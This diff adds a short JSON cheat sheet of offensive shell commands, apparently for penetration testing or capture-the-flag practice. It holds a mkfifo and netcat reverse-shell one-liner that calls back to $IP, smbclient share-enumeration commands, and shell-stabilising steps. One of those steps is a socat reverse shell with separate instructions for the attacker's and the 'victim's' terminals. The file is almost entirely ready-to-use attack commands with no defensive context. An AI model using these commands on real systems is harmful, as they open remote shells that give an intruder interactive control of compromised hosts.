@@ -1,0 +1,13 @@
+{
+    "Rev Shell":{
+        "Python-rm shell" : "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 1234 >/tmp/f"
+    },
+    "SMBClient":{
+        "Default" : "smbclient -L \\\\\\\\\\\\\\\\$IP\\\\\\\\",
+        "Connecting" : "smbclient \\\\\\\\\\\\\\\\$IP\\\\\\\\$server"
+    },
+    "Shell Stable":{
+        "Python" : "python3 -c 'import pty;pty.spawn(\"/bin/sh\")'",
+        "Socat" : "1. On your terminal:\n\tsocat file:`tty`,raw,echo=0 tcp-listen:4444\n2. On victim's terminal:\n\tsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444"
+    }
+}
